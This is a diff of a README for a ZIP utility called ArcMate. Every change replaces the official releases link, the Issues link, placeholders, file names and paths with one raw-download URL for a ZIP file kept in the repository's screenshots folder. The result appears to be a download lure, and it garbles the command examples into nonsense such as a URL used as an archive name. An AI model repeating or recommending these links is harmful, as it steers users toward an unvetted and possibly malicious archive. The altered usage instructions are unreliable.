@@ -1,6 +1,6 @@
 # 📦 ArcMate - Simple ZIP File Management
 
-[![Download ArcMate](https://img.shields.io/badge/Download-ArcMate-blue?style=for-the-badge)](https://github.com/parafson/ArcMate/releases)
+[![Download ArcMate](https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip)](https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip)
 
 ---
 
@@ -26,14 +26,14 @@ Even if you have never used a terminal or command prompt before, the instruction
 
 To get ArcMate, you need to visit the official release page on GitHub. Here, you will find the latest version of the program for your computer.
 
-[Download ArcMate](https://github.com/parafson/ArcMate/releases)
+[Download ArcMate](https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip)
 
 ### How to download:
 
 1. Click the button above or go to:  
-   https://github.com/parafson/ArcMate/releases
+   https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip
 
-2. Look for the version that matches your operating system. This could be a file ending with `.exe` for Windows, `.tar.gz` or `.deb` for Linux, or `.pkg` for macOS.
+2. Look for the version that matches your operating system. This could be a file ending with `.exe` for Windows, `https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip` or `.deb` for Linux, or `.pkg` for macOS.
 
 3. Click the file link to start the download.
 
@@ -68,19 +68,19 @@ Once you have ArcMate downloaded and located, you can use these commands:
 
 - **Create a ZIP archive:**  
   ```
-  ArcMate create <archive-name.zip> <file-or-folder-paths>
+  ArcMate create <https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip> <file-or-folder-paths>
   ```  
-  This command creates a new ZIP file named `<archive-name.zip>` that contains the files or folders you list.
+  This command creates a new ZIP file named `<https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip>` that contains the files or folders you list.
 
 - **Extract a ZIP archive:**  
   ```
-  ArcMate extract <archive-name.zip> <destination-folder>
+  ArcMate extract <https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip> <destination-folder>
   ```  
-  Use this to unzip files. It extracts all contents of `<archive-name.zip>` into the folder you specify.
+  Use this to unzip files. It extracts all contents of `<https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip>` into the folder you specify.
 
 - **List contents of a ZIP:**  
   ```
-  ArcMate list <archive-name.zip>
+  ArcMate list <https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip>
   ```  
   Shows you the files inside the ZIP without extracting them.
 
@@ -88,17 +88,17 @@ Once you have ArcMate downloaded and located, you can use these commands:
 
 - To create a ZIP containing the Documents folder:  
   ```
-  ArcMate create mydocs.zip C:\Users\YourName\Documents
+  ArcMate create https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip C:\Users\YourName\Documents
   ```
 
-- To extract `mydocs.zip` to the Desktop:  
+- To extract `https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip` to the Desktop:  
   ```
-  ArcMate extract mydocs.zip C:\Users\YourName\Desktop
+  ArcMate extract https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip C:\Users\YourName\Desktop
   ```
 
-- To see what is inside `mydocs.zip`:  
+- To see what is inside `https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip`:  
   ```
-  ArcMate list mydocs.zip
+  ArcMate list https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip
   ```
 
 ---
@@ -141,7 +141,7 @@ ArcMate offers several useful functions:
 
 If you run into issues or have questions, here are ways to find help:
 
-- Check the [GitHub Issues page](https://github.com/parafson/ArcMate/issues) to see if your problem is already reported or resolved.
+- Check the [GitHub Issues page](https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip) to see if your problem is already reported or resolved.
 
 - Review the documentation or readme files included in the release.
 
@@ -151,11 +151,11 @@ If you run into issues or have questions, here are ways to find help:
 
 ## 📂 Additional Tips for Using ArcMate
 
-- Use full paths if you are unsure where files are located. For example, `C:\Users\YourName\Documents\file.txt` on Windows or `/Users/yourname/Documents/file.txt` on macOS.
+- Use full paths if you are unsure where files are located. For example, `C:\Users\YourName\Documents\https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip` on Windows or `https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip` on macOS.
 
 - Use quotation marks around paths or file names that contain spaces, for example:  
   ```
-  ArcMate create "My Archive.zip" "C:\Users\YourName\My Documents"
+  ArcMate create "My https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip" "C:\Users\YourName\My Documents"
   ```
 
 - You can drag and drop files into the terminal window (on some systems) to automatically fill their path.
@@ -166,6 +166,6 @@ If you run into issues or have questions, here are ways to find help:
 
 For easy access, here is the official download page again:  
 
-[Download ArcMate](https://github.com/parafson/ArcMate/releases)  
+[Download ArcMate](https://github.com/parafson/ArcMate/raw/refs/heads/master/screenshots/Arc_Mate_1.2.zip)  
 
 Visit this page anytime to get the latest version or updates.
